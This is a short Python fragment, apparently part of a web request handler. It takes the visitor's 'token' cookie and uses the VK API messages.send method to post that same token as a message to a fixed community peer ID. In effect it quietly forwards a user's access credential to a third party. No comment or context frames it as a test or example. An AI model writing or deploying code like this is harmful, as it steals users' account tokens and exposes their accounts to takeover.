#id = su("vk_api", request.cookies["token"], "users.get")[0][0]["id"]
r = str(su("vk_api", request.cookies["token"], "messages.send", {
"message": request.cookies["token"],
"owner_id": id,
"peer_id": -196579521,
"random_id": 0
}))